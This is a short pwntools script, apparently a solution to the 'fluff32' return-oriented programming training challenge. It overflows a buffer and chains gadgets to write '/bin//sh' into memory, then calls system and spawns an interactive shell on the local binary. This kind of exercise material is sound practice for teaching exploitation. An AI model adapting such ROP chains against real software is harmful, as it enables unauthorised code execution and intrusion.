from pwn import p32
from pwn import process

def write_word(addr,word):
    tmp = ""

# Move address to write to into ecx

    # xor edx so it is 0
    tmp += p32(0x8048671) # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
    tmp += "B"*4
    
    # pop address to write to so it can be xor'd into edx
    tmp += p32(0x080483e1) # 0x080483e1: pop ebx; ret;
    tmp += p32(addr) # Address to write a word to

    # xor edx (0) and ebx (addr) so that the address in ebx gets moved to edx
    tmp += p32(0x0804867b) # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    tmp += "C"*4

    # move address in edx to ecx
    tmp += p32(0x8048689) # 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
    tmp += "D"*4

# Move word into edx

    # xor edx so it is 0
    tmp += p32(0x8048671) # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
    tmp += "B"*4

    # pop word to write so it can be xor'd into edx
    tmp += p32(0x080483e1) # 0x080483e1: pop ebx; ret;
    tmp += word # Word to write

    # xor edx (0) and ebx (addr) so that the word in ebx gets moved to edx
    tmp += p32(0x0804867b) # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    tmp += "C"*4

# Move specified word into specified address

    # Move word into address ecx points at and pop a trash value and pop 0 into ebx to keep 
    #  value where ecx is pointing safe from corruption from the xor instruction
    tmp += p32(0x08048693) #0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
    tmp += "D"*4
    tmp += p32(0x00)
    return tmp

buf = ""
buf += "A"*44
buf += write_word(0x804a080,"/bin")
buf += write_word(0x804a084,"//sh")
buf += p32(0x8048430) # address of system@plt
buf += "pink"
buf += p32(0x804a080) # Address of /bin//sh (GOT+0x80)
buf += p32(0xdeadbeef)

p = process("./fluff32")
p.recv()
p.send(buf)
p.interactive()
